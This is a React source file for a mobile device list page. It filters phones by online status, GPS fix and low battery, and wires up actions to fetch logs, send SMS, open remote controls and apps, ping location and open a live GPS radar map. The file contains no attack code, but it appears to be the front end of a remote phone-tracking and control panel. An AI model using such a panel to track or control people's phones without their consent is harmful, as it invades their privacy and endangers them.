import { useState } from 'react';
import { Search, Filter, Radio, X, Check } from 'lucide-react';
import MobileDeviceCard from './MobileDeviceCard';
import './MobileDeviceList.css';

export default function MobileDeviceList({
  devices = [],
  loading,
  onFetchLogs,
  onSendSms,
  onOpenControls,
  onOpenApps,
  onPingLocation,
  onDeleteDevice,
  onOpenRadarMap
}) {
  const [searchTerm, setSearchTerm] = useState('');
  const [filterMode, setFilterMode] = useState('all'); // all, online, gps, low_batt
  const [showFilterSheet, setShowFilterSheet] = useState(false);

  const activeCount = devices.filter(
    (d) =>
      d.is_active &&
      d.last_seen_at &&
      Date.now() - new Date(d.last_seen_at).getTime() < 600000
  ).length;

  const filteredDevices = devices.filter((d) => {
    // Search query
    const q = searchTerm.toLowerCase();
    const matchSearch =
      (d.device_name || '').toLowerCase().includes(q) ||
      (d.device_id || '').toLowerCase().includes(q) ||
      (d.model || '').toLowerCase().includes(q) ||
      (d.phone_number || '').toLowerCase().includes(q) ||
      (d.sim_1 || '').toLowerCase().includes(q) ||
      (d.network_carrier || '').toLowerCase().includes(q);

    if (!matchSearch) return false;

    // Filter mode
    if (filterMode === 'online') {
      const isOnline =
        d.is_active &&
        d.last_seen_at &&
        Date.now() - new Date(d.last_seen_at).getTime() < 600000;
      return isOnline;
    }
    if (filterMode === 'gps') {
      return d.latitude !== null && d.latitude !== undefined;
    }
    if (filterMode === 'low_batt') {
      return d.battery_level !== null && d.battery_level !== undefined && d.battery_level <= 20;
    }

    return true;
  });

  return (
    <div className="mobile-device-list-page" id="mobile-device-list-page">
      {/* Search Bar + Circular Filter Button */}
      <div className="devices-search-row">
        <div className="devices-search-box">
          <Search size={16} className="search-input-icon" />
          <input
            type="text"
            placeholder="Search devices, phone number..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="devices-search-input"
            id="devices-search-input"
          />
          {searchTerm && (
            <button className="search-clear-btn" onClick={() => setSearchTerm('')}>
              <X size={14} />
            </button>
          )}
        </div>

        {/* Circular Filter Funnel Button */}
        <button
          className={`filter-funnel-btn ${filterMode !== 'all' ? 'filter-funnel-btn--active' : ''}`}
          onClick={() => setShowFilterSheet(true)}
          title="Filter devices"
          aria-label="Filter"
        >
          <Filter size={18} />
        </button>
      </div>

      {/* Subheader: All Devices (129) + 63 online • */}
      <div className="devices-subheader-row">
        <h3 className="all-devices-heading">All Devices ({devices.length})</h3>

        <div className="online-status-badge">
          <span>{activeCount} online</span>
          <span className="badge-dot" />
        </div>
      </div>

      {/* Active Filter Pill (if any applied) */}
      {filterMode !== 'all' && (
        <div className="active-filter-indicator">
          <span>Filtered by: <strong>{filterMode.toUpperCase()}</strong></span>
          <button className="clear-filter-text" onClick={() => setFilterMode('all')}>
            Reset
          </button>
        </div>
      )}

      {/* Device Cards List */}
      <div className="devices-cards-stack">
        {filteredDevices.map((device, idx) => {
          // Assign clean index number descending (like in screenshot: 129, 128, 127...)
          const indexNum = devices.length - idx;

          return (
            <MobileDeviceCard
              key={device.device_id || idx}
              device={device}
              indexNumber={indexNum}
              onFetchLogs={onFetchLogs}
              onSendSms={onSendSms}
              onOpenControls={onOpenControls}
              onOpenApps={onOpenApps}
              onPingLocation={onPingLocation}
              onDelete={onDeleteDevice}
            />
          );
        })}

        {filteredDevices.length === 0 && !loading && (
          <div className="no-devices-placeholder">
            <p className="placeholder-title">No devices matched</p>
            <p className="placeholder-sub">Try searching another device ID or carrier name</p>
          </div>
        )}
      </div>

      {/* Floating Action Button (FAB) for Live Radar Map */}
      <button
        className="radar-map-fab"
        onClick={onOpenRadarMap}
        title="Open Live GPS Radar Map"
        aria-label="Live Radar Map"
        id="radar-map-fab"
      >
        <Radio size={24} className="fab-radio-icon" />
      </button>

      {/* Filter Bottom Sheet */}
      {showFilterSheet && (
        <>
          <div className="sheet-backdrop" onClick={() => setShowFilterSheet(false)} />
          <div className="filter-bottom-sheet">
            <div className="sheet-handle-bar" />
            <div className="sheet-title-row">
              <h4 className="sheet-title">Filter Devices</h4>
              <button className="sheet-close-btn" onClick={() => setShowFilterSheet(false)}>
                <X size={18} />
              </button>
            </div>

            <div className="sheet-options-list">
              {[
                { id: 'all', label: `All Devices (${devices.length})` },
                { id: 'online', label: `Online Only (${activeCount})` },
                { id: 'gps', label: 'With Active GPS Fix' },
                { id: 'low_batt', label: 'Low Battery (â‰¤20%)' },
              ].map((opt) => (
                <button
                  key={opt.id}
                  className={`sheet-option-btn ${filterMode === opt.id ? 'is-selected' : ''}`}
                  onClick={() => {
                    setFilterMode(opt.id);
                    setShowFilterSheet(false);
                  }}
                >
                  <span>{opt.label}</span>
                  {filterMode === opt.id && <Check size={16} className="text-blue" />}
                </button>
              ))}
            </div>
          </div>
        </>
      )}
    </div>
  );
}
